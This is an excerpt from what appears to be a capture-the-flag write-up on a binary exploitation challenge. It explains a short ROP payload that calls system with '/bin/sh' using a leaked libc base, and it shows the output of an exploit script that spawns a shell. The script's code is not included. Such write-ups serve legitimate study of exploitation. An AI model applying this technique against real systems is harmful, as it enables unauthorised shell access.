...
arbitrary values onto the stack. We can just write a very small ROP payload,
that calls `system` with `"/bin/sh"` as the argument (the latter can be found
as a string in the libc binary).
...
reliably gives shell access and we are able to retrieve the flag
    ...
    $ python2 exploit.py
    [*] leaked libc base = 0xf7438000
    [*] writing ROP 0 0xf7476770
    [*] writing ROP 1 0x0
    [*] writing ROP 2 0xf7598264
    [*] Enjoy your shell ;)
